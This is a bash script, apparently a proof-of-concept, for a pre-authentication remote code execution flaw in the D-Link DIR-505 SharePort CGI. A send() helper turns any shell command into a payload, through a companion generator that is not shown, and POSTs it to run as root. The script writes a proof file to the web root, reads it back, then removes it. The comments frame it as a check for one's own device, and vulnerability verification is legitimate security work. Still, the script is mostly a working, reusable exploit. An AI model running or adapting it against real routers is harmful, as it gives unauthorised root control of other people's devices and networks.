#!/bin/bash
# DIR-505 SharePort webfile_cgi.cgi pre-auth RCE — one-shot verification for your own device
# RCE writes a proof file -> read it back over the existing 8181 port -> clean up
#
# Usage:   ./verify_device.sh <host> [port]
# Example: ./verify_device.sh 192.168.0.1 8181
#
# Notes:
#  - Opens no extra ports and needs no session; only writes one temporary file to the web
#    root /www/webfile_access/ (RAM-backed on this device).
#  - Each request kills the CGI process only (HTTP 500 is the expected signature);
#    lighttpd itself is not affected.
#  - If the target firmware build differs from 1.10B02, the attempt only crashes that one
#    CGI invocation (HTTP 500) with no other effect.
#  - For owned/authorized devices only.
set -e
HOST="${1:?usage: $0 <host> [port]}"
PORT="${2:-8181}"
HERE="$(cd "$(dirname "$0")" && pwd)"
MARK="/www/webfile_access/rce_proof_$$.txt"
NAME="$(basename "$MARK")"
TMPPOC="/tmp/rce_poc_$$.bin"

send() {   # $1 = shell command to run as root on the device
    python3 "$HERE/gen_poc.py" --out "$TMPPOC" "$1" >/dev/null
    curl -s -m 15 -o /dev/null -w "    POST -> HTTP %{http_code}\n" \
        -X POST "http://$HOST:$PORT/dws/api/ListRoot" \
        -H 'Content-Type: application/x-www-form-urlencoded' \
        --data-binary "@$TMPPOC"
}

echo "[*] target       : $HOST:$PORT"
LOGIN_CODE=$(curl -s -m 8 -o /dev/null -w '%{http_code}' "http://$HOST:$PORT/dws/api/Login" || true)
echo "[*] preflight    : GET /dws/api/Login -> HTTP $LOGIN_CODE"
echo "[*] login banner : $(curl -s -m 8 "http://$HOST:$PORT/dws/api/Login" | head -c 200)"
echo

echo "[1/3] execute: echo RCE_PROOF_OK_<ts> > $MARK   (as root)"
send "echo RCE_PROOF_OK_\$(date +%s) > $MARK; kill -9 \$PPID"
sleep 1

echo "[2/3] readback: GET /$NAME"
BODY=$(curl -s -m 8 "http://$HOST:$PORT/$NAME" || true)
echo "    $BODY"
case "$BODY" in
    RCE_PROOF_OK_*) echo "    [SUCCESS] unauthenticated root command execution confirmed";;
    *)              echo "    [FAIL] no proof (different build? firewall? /www not writable?)";;
esac
echo

echo "[3/3] cleanup: rm -f $MARK"
send "rm -f $MARK; kill -9 \$PPID"
sleep 1
CODE=$(curl -s -m 8 -o /dev/null -w '%{http_code}' "http://$HOST:$PORT/$NAME" || true)
echo "    GET /$NAME -> HTTP $CODE (expect 404)"
rm -f "$TMPPOC"
